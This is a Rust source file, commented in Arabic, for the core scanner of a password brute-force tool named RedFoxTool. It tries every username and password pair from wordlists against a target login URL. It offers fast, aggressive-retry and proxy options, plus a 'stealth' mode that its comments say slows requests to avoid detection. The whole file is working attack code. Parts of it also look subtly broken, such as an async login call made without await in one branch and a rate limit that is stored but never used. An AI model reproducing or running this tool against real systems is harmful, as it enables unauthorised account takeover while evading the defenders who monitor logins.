//! الماسح الرئيسي لـ RedFoxTool
//! يدير عملية الفحص الكاملة

use std::sync::Arc;
use std::time::{Instant, Duration};
use tokio::sync::Semaphore;
use anyhow::{Result, Context};
use indicatif::{ProgressBar, ProgressStyle};

use crate::bruteforcer::{Bruteforcer, AttackMode};
use crate::http_client::HttpClient;
use crate::parser::parse_input;
use crate::progress::ProgressTracker;
use crate::utils::logger::Logger;

/// نتيجة فحص واحدة
#[derive(Debug, Clone, serde::Serialize)]
pub struct ScanResult {
    /// اسم المستخدم
    pub username: String,
    
    /// كلمة المرور
    pub password: String,
    
    /// هل كانت المحاولة ناجحة؟
    pub success: bool,
    
    /// رمز حالة HTTP
    pub status_code: u16,
    
    /// وقت الاستجابة
    pub response_time: Duration,
    
    /// رسالة الخطأ إذا فشلت
    pub error: Option<String>,
    
    /// الطابع الزمني
    pub timestamp: chrono::DateTime<chrono::Utc>,
}

/// الماسح الرئيسي
pub struct RedFoxScanner {
    http_client: Arc<HttpClient>,
    users: Vec<String>,
    passwords: Vec<String>,
    max_workers: usize,
    attack_mode: AttackMode,
    rate_limit: Option<u32>,
    logger: Logger,
}

impl RedFoxScanner {
    /// إنشاء ماسح جديد
    pub async fn new(
        url: &str,
        user_input: &str,
        password_file: &str,
        max_workers: usize,
        timeout: u64,
        mode: &str,
        rate_limit: Option<u32>,
    ) -> Result<Self> {
        let logger = Logger::new(true);
        
        logger.info(&format!("تهيئة الماسح للهدف: {}", url));
        logger.info(&format!("وضع الهجوم: {}", mode));
        logger.info(&format!("الخيوط: {}", max_workers));
        
        // إنشاء عميل HTTP
        let http_client = Arc::new(
            HttpClient::new(url, timeout, None)
                .await
                .context("فشل في إنشاء عميل HTTP")?
        );
        
        // تحليل المدخلات
        logger.info("تحليل قوائم المستخدمين وكلمات المرور...");
        let users = parse_input(user_input)
            .await
            .context("فشل في تحليل المستخدمين")?;
        
        let passwords = parse_input(password_file)
            .await
            .context("فشل في تحليل كلمات المرور")?;
        
        logger.info(&format!("تم تحميل {} مستخدم", users.len()));
        logger.info(&format!("تم تحميل {} كلمة مرور", passwords.len()));
        
        // تحويل وضع الهجوم
        let attack_mode = match mode.to_lowercase().as_str() {
            "fast" => AttackMode::Fast,
            "stealth" => AttackMode::Stealth,
            "aggressive" => AttackMode::Aggressive,
            _ => AttackMode::Normal,
        };
        
        Ok(Self {
            http_client,
            users,
            passwords,
            max_workers,
            attack_mode,
            rate_limit,
            logger,
        })
    }
    
    /// تعيين بروكسي
    pub async fn set_proxy(&mut self, proxy_url: &str) -> Result<()> {
        self.logger.info(&format!("تعيين بروكسي: {}", proxy_url));
        
        let new_client = Arc::new(
            HttpClient::new(&self.http_client.base_url, 30, Some(proxy_url))
                .await
                .context("فشل في إنشاء عميل HTTP مع بروكسي")?
        );
        
        self.http_client = new_client;
        Ok(())
    }
    
    /// تنفيذ الفحص
    pub async fn scan(&self, verbose: bool) -> Result<Vec<ScanResult>> {
        let start_time = Instant::now();
        let total_attempts = self.users.len() * self.passwords.len();
        
        self.logger.info(&format!("بدء الفحص: {} محاولة", total_attempts));
        
        // إنشاء شريط التقدم
        let progress = if verbose {
            let pb = ProgressBar::new(total_attempts as u64);
            pb.set_style(
                ProgressStyle::default_bar()
                    .template("{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} ({eta}) {msg}")
                    .unwrap()
                    .progress_chars("#>-")
            );
            Some(pb)
        } else {
            None
        };
        
        // إنشاء متعقب التقدم
        let progress_tracker = ProgressTracker::new(total_attempts);
        
        // إنشاء مقسم الطلبات
        let semaphore = Arc::new(Semaphore::new(self.max_workers));
        
        // تجميع النتائج
        let mut results = Vec::with_capacity(total_attempts);
        
        // تنفيذ الفحص حسب وضع الهجوم
        match self.attack_mode {
            AttackMode::Fast => {
                results = self.scan_fast(&semaphore, progress.as_ref()).await?;
            }
            AttackMode::Normal => {
                results = self.scan_normal(&semaphore, progress.as_ref()).await?;
            }
            AttackMode::Stealth => {
                results = self.scan_stealth(&semaphore, progress.as_ref()).await?;
            }
            AttackMode::Aggressive => {
                results = self.scan_aggressive(&semaphore, progress.as_ref()).await?;
            }
        }
        
        // إكمال شريط التقدم
        if let Some(pb) = progress {
            pb.finish_with_message("اكتمل!");
        }
        
        let duration = start_time.elapsed();
        let rps = total_attempts as f64 / duration.as_secs_f64();
        
        self.logger.success(&format!(
            "اكتمل الفحص في {:.2?} ({:.1} محاولة/ثانية)",
            duration, rps
        ));
        
        Ok(results)
    }
    
    /// فحص سريع (أقصى سرعة)
    async fn scan_fast(
        &self,
        semaphore: &Arc<Semaphore>,
        progress: Option<&ProgressBar>,
    ) -> Result<Vec<ScanResult>> {
        self.logger.info("بدء الفحص السريع...");
        
        let mut handles = Vec::new();
        let results = Arc::new(tokio::sync::Mutex::new(Vec::new()));
        
        // تقسيم العمل إلى قطع
        let chunk_size = (self.users.len() / self.max_workers).max(1);
        
        for chunk in self.users.chunks(chunk_size) {
            let chunk_users = chunk.to_vec();
            let chunk_passwords = self.passwords.clone();
            let client = Arc::clone(&self.http_client);
            let results_ref = Arc::clone(&results);
            let semaphore = Arc::clone(semaphore);
            
            let handle = tokio::spawn(async move {
                let mut chunk_results = Vec::new();
                
                for username in chunk_users {
                    for password in &chunk_passwords {
                        let _permit = semaphore.acquire().await.unwrap();
                        
                        let start = Instant::now();
                        let result = match client.test_login(&username, password).await {
                            Ok(response) => {
                                let success = response.status().is_success();
                                let status_code = response.status().as_u16();
                                let response_time = start.elapsed();
                                
                                ScanResult {
                                    username: username.clone(),
                                    password: password.clone(),
                                    success,
                                    status_code,
                                    response_time,
                                    error: None,
                                    timestamp: chrono::Utc::now(),
                                }
                            }
                            Err(e) => {
                                ScanResult {
                                    username: username.clone(),
                                    password: password.clone(),
                                    success: false,
                                    status_code: 0,
                                    response_time: start.elapsed(),
                                    error: Some(e.to_string()),
                                    timestamp: chrono::Utc::now(),
                                }
                            }
                        };
                        
                        chunk_results.push(result);
                        
                        // تحديث التقدم
                        if let Some(pb) = progress {
                            pb.inc(1);
                        }
                    }
                }
                
                let mut results_lock = results_ref.lock().await;
                results_lock.extend(chunk_results);
            });
            
            handles.push(handle);
        }
        
        // انتظار اكتمال جميع المهام
        for handle in handles {
            handle.await?;
        }
        
        let final_results = results.lock().await.clone();
        Ok(final_results)
    }
    
    /// فحص عادي (متوازن)
    async fn scan_normal(
        &self,
        semaphore: &Arc<Semaphore>,
        progress: Option<&ProgressBar>,
    ) -> Result<Vec<ScanResult>> {
        self.logger.info("بدء الفحص العادي...");
        
        let mut results = Vec::new();
        
        // استخدام قناة للإنتاج والاستهلاك
        let (tx, mut rx) = tokio::sync::mpsc::channel(1000);
        
        // إنتاج المهام
        let producer = tokio::spawn({
            let users = self.users.clone();
            let passwords = self.passwords.clone();
            let client = Arc::clone(&self.http_client);
            let tx = tx.clone();
            
            async move {
                for username in users {
                    for password in &passwords {
                        let client = Arc::clone(&client);
                        let tx = tx.clone();
                        let username_clone = username.clone();
                        let password_clone = password.clone();
                        
                        tokio::spawn(async move {
                            let result = client.test_login(&username_clone, &password_clone).await;
                            let _ = tx.send((username_clone, password_clone, result)).await;
                        });
                    }
                }
            }
        });
        
        // استهلاك النتائج
        let consumer = tokio::spawn(async move {
            let mut local_results = Vec::new();
            
            while let Some((username, password, result)) = rx.recv().await {
                let scan_result = match result {
                    Ok(response) => {
                        let success = response.status().is_success();
                        let status_code = response.status().as_u16();
                        
                        ScanResult {
                            username,
                            password,
                            success,
                            status_code,
                            response_time: Duration::default(),
                            error: None,
                            timestamp: chrono::Utc::now(),
                        }
                    }
                    Err(e) => {
                        ScanResult {
                            username,
                            password,
                            success: false,
                            status_code: 0,
                            response_time: Duration::default(),
                            error: Some(e.to_string()),
                            timestamp: chrono::Utc::now(),
                        }
                    }
                };
                
                local_results.push(scan_result);
                
                // تحديث التقدم
                if let Some(pb) = progress {
                    pb.inc(1);
                }
            }
            
            local_results
        });
        
        // انتظار المنتج
        producer.await?;
        drop(tx); // إغلاق القناة
        
        // الحصول على النتائج من المستهلك
        results = consumer.await?;
        
        Ok(results)
    }
    
    /// فحص خفي (ببطء لتجنب الاكتشاف)
    async fn scan_stealth(
        &self,
        _semaphore: &Arc<Semaphore>,
        progress: Option<&ProgressBar>,
    ) -> Result<Vec<ScanResult>> {
        self.logger.info("بدء الفحص الخفي...");
        
        let mut results = Vec::new();
        let delay = Duration::from_millis(100); // تأخير 100ms بين الطلبات
        
        for username in &self.users {
            for password in &self.passwords {
                let start = Instant::now();
                
                let result = match self.http_client.test_login(username, password).await {
                    Ok(response) => {
                        let success = response.status().is_success();
                        let status_code = response.status().as_u16();
                        let response_time = start.elapsed();
                        
                        ScanResult {
                            username: username.clone(),
                            password: password.clone(),
                            success,
                            status_code,
                            response_time,
                            error: None,
                            timestamp: chrono::Utc::now(),
                        }
                    }
                    Err(e) => {
                        ScanResult {
                            username: username.clone(),
                            password: password.clone(),
                            success: false,
                            status_code: 0,
                            response_time: start.elapsed(),
                            error: Some(e.to_string()),
                            timestamp: chrono::Utc::now(),
                        }
                    }
                };
                
                results.push(result);
                
                // تحديث التقدم
                if let Some(pb) = progress {
                    pb.inc(1);
                }
                
                // تأخير لتجنب الاكتشاف
                tokio::time::sleep(delay).await;
            }
        }
        
        Ok(results)
    }
    
    /// فحص عدواني (أقصى قوة مع إعادة المحاولة)
    async fn scan_aggressive(
        &self,
        semaphore: &Arc<Semaphore>,
        progress: Option<&ProgressBar>,
    ) -> Result<Vec<ScanResult>> {
        self.logger.info("بدء الفحص العدواني...");
        
        let mut results = Vec::new();
        let retry_count = 3;
        
        // استخدام Rayon للمعالجة المتوازية المكثفة
        #[cfg(feature = "rayon")]
        {
            use rayon::prelude::*;
            
            let all_combinations: Vec<(String, String)> = self.users
                .par_iter()
                .flat_map(|user| {
                    self.passwords.par_iter().map(|pass| {
                        (user.clone(), pass.clone())
                    })
                })
                .collect();
            
            let chunked_results: Vec<Vec<ScanResult>> = all_combinations
                .par_chunks(1000)
                .map(|chunk| {
                    let mut chunk_results = Vec::new();
                    
                    for (username, password) in chunk {
                        for attempt in 0..retry_count {
                            match self.http_client.test_login(username, password) {
                                Ok(response) => {
                                    let result = ScanResult {
                                        username: username.clone(),
                                        password: password.clone(),
                                        success: response.status().is_success(),
                                        status_code: response.status().as_u16(),
                                        response_time: Duration::default(),
                                        error: None,
                                        timestamp: chrono::Utc::now(),
                                    };
                                    chunk_results.push(result);
                                    break;
                                }
                                Err(_) if attempt < retry_count - 1 => {
                                    // إعادة المحاولة بعد تأخير قصير
                                    std::thread::sleep(Duration::from_millis(50));
                                }
                                Err(e) => {
                                    chunk_results.push(ScanResult {
                                        username: username.clone(),
                                        password: password.clone(),
                                        success: false,
                                        status_code: 0,
                                        response_time: Duration::default(),
                                        error: Some(e.to_string()),
                                        timestamp: chrono::Utc::now(),
                                    });
                                }
                            }
                        }
                    }
                    
                    chunk_results
                })
                .collect();
            
            for chunk in chunked_results {
                results.extend(chunk);
            }
        }
        
        #[cfg(not(feature = "rayon"))]
        {
            // نسخة بديلة بدون Rayon
            for username in &self.users {
                for password in &self.passwords {
                    let _permit = semaphore.acquire().await?;
                    
                    let start = Instant::now();
                    let mut last_error = None;
                    
                    for attempt in 0..retry_count {
                        match self.http_client.test_login(username, password).await {
                            Ok(response) => {
                                let result = ScanResult {
                                    username: username.clone(),
                                    password: password.clone(),
                                    success: response.status().is_success(),
                                    status_code: response.status().as_u16(),
                                    response_time: start.elapsed(),
                                    error: None,
                                    timestamp: chrono::Utc::now(),
                                };
                                results.push(result);
                                break;
                            }
                            Err(e) => {
                                last_error = Some(e);
                                if attempt < retry_count - 1 {
                                    tokio::time::sleep(Duration::from_millis(100)).await;
                                }
                            }
                        }
                    }
                    
                    if let Some(e) = last_error {
                        results.push(ScanResult {
                            username: username.clone(),
                            password: password.clone(),
                            success: false,
                            status_code: 0,
                            response_time: start.elapsed(),
                            error: Some(e.to_string()),
                            timestamp: chrono::Utc::now(),
                        });
                    }
                    
                    // تحديث التقدم
                    if let Some(pb) = progress {
                        pb.inc(1);
                    }
                }
            }
        }
        
        Ok(results)
    }
    
    /// فحص كلمات مرور محددة
    pub async fn scan_specific_passwords(
        &self,
        passwords: &[&str],
    ) -> Result<Vec<ScanResult>> {
        self.logger.info(&format!("فحص {} كلمة مرور محددة", passwords.len()));
        
        let mut results = Vec::new();
        let semaphore = Arc::new(tokio::sync::Semaphore::new(self.max_workers));
        
        for username in &self.users {
            for password in passwords {
                let _permit = semaphore.acquire().await?;
                
                let start = Instant::now();
                match self.http_client.test_login(username, password).await {
                    Ok(response) => {
                        results.push(ScanResult {
                            username: username.clone(),
                            password: (*password).to_string(),
                            success: response.status().is_success(),
                            status_code: response.status().as_u16(),
                            response_time: start.elapsed(),
                            error: None,
                            timestamp: chrono::Utc::now(),
                        });
                    }
                    Err(e) => {
                        results.push(ScanResult {
                            username: username.clone(),
                            password: (*password).to_string(),
                            success: false,
                            status_code: 0,
                            response_time: start.elapsed(),
                            error: Some(e.to_string()),
                            timestamp: chrono::Utc::now(),
                        });
                    }
                }
            }
        }
        
        Ok(results)
    }
    
    /// الحصول على إحصائيات الفحص
    pub fn get_stats(&self) -> serde_json::Value {
        serde_json::json!({
            "total_users": self.users.len(),
            "total_passwords": self.passwords.len(),
            "total_attempts": self.users.len() * self.passwords.len(),
            "max_workers": self.max_workers,
            "attack_mode": format!("{:?}", self.attack_mode),
            "rate_limit": self.rate_limit,
        })
    }
}